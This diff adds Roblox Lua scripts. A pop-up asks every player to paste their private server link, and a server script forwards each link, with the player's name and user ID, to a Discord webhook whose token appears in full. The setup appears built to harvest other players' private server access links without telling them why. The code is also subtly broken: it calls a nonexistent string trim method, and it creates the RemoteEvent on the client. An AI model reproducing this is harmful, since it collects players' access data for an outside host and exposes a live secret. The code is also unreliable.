@@ -1,0 +1,107 @@
+-- LocalScript (StarterPlayerScripts) + ServerScript (ServerScriptService)
+
+-- LOCALSCRIPT
+local P = game.Players.LocalPlayer
+local PG = P.PlayerGui
+local RS = game.ReplicatedStorage
+
+local Event = RS:FindFirstChild("SubmitServerToDiscord") or Instance.new("RemoteEvent", RS)
+Event.Name = "SubmitServerToDiscord"
+
+local SG = Instance.new("ScreenGui", PG)
+local Menu = Instance.new("Frame", SG)
+Menu.Size = UDim2.new(0,320,0,180)
+Menu.Position = UDim2.new(0.5,-160,0.5,-90)
+Menu.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
+Menu.BorderColor3 = Color3.new(0.3,0.3,0.3)
+
+local Lbl = Instance.new("TextLabel", Menu)
+Lbl.Size = UDim2.new(1,0,0,30)
+Lbl.Text = "Paste Your Private Server Link"
+Lbl.TextColor3 = Color3.new(1,1,1)
+Lbl.BackgroundTransparency = 1
+Lbl.TextScaled = true
+
+local Input = Instance.new("TextBox", Menu)
+Input.Size = UDim2.new(0.9,0,0,35)
+Input.Position = UDim2.new(0.05,0,0.25,0)
+Input.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
+Input.TextColor3 = Color3.new(1,1,1)
+Input.PlaceholderText = "https://roblox.com/games/...?privateServerLinkCode=..."
+Input.ClearTextOnFocus = false
+
+local Btn = Instance.new("TextButton", Menu)
+Btn.Size = UDim2.new(0.9,0,0,40)
+Btn.Position = UDim2.new(0.05,0,0.6,0)
+Btn.BackgroundColor3 = Color3.new(0.2,0.6,0.2)
+Btn.Text = "Submit Link"
+Btn.TextColor3 = Color3.new(1,1,1)
+Btn.TextScaled = true
+
+Btn.MouseButton1Click:Connect(function()
+    local link = Input.Text:trim()
+    if link:match("privateServerLinkCode=") and link:match("roblox%.com/games/") then
+        Event:FireServer(link)
+        Input.Text = "✅ Submitted successfully!"
+        Input.TextEditable = false
+        task.wait(2.5)
+        Input.Text = ""
+        Input.TextEditable = true
+    else
+        Input.Text = "❌ Invalid private server link!"
+        task.wait(1.5)
+        Input.Text = ""
+    end
+end)
+
+-- SERVERSCRIPT
+local RS = game.ReplicatedStorage
+local HTTPS = game:GetService("HttpService")
+local DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1441028517566611597/HF2gM3J7dCmHQi5zZQDafkH9PejGHq9-DYF6f-jEZPDuJOZ77dIz9M8kB7xQ1K5VoGi1" -- REPLACE THIS
+local OWNER_ID = 9548349523 -- REPLACE WITH YOUR ROBLOX USER ID
+
+local Event = RS:WaitForChild("SubmitServerToDiscord")
+
+-- Send to YOUR private Discord channel only
+local function sendToDiscord(submission)
+    local embed = {
+        title = "🔗 New Private Server Link Submission",
+        color = 65280, -- Green
+        fields = {
+            {name = "Player", value = string.format("%s (%d)", submission.name, submission.id), inline = false},
+            {name = "Time", value = submission.time, inline = false},
+            {name = "Link", value = submission.link, inline = false}
+        }
+    }
+    local data = {embeds = {embed}}
+    pcall(function()
+        HTTPS:PostAsync(DISCORD_WEBHOOK, HTTPS:JSONEncode(data))
+    end)
+end
+
+-- All players can submit; submissions only go to your private channel
+Event.OnServerEvent:Connect(function(player, link)
+    sendToDiscord({
+        name = player.Name,
+        id = player.UserId,
+        time = os.date("%Y-%m-%d %H:%M:%S"),
+        link = link
+    })
+end)
+
+-- Owner-only test command to check webhook
+game.Players.PlayerAdded:Connect(function(p)
+    if p.UserId == OWNER_ID then
+        p.Chatted:Connect(function(msg)
+            if msg:lower() == "/testdiscord" then
+                sendToDiscord({
+                    name = "Test User",
+                    id = 0,
+                    time = os.date(),
+                    link = "https://roblox.com/games/test?privateServerLinkCode=test"
+                })
+                p:SendMessage("📤 Test sent to your Discord channel!")
+            end
+        end)
+    end
+end)
